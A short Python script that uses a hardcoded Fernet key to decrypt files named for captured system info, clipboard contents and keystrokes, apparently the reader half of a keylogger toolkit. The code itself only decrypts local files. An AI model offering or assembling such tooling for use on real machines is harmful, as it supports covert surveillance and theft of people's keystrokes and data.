from cryptography.fernet import Fernet

# Define the encryption key
key = "yl9q7b92u2Knh8hJFYXqVVvl5fnpv20Z3yRsCD3nAcI="


# Define the paths to the encrypted files
encrypted_files = [
    "e_systeminfo.txt",
    "e_clipboard.txt",
    "e_key_log.txt"
]

# Decrypt each encrypted file
for encrypted_file in encrypted_files:
    with open(encrypted_file, 'rb') as file:
        encrypted_data = file.read()

    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)

    # Write the decrypted data back to the same file
    with open(encrypted_file, 'wb') as file:
        file.write(decrypted_data)
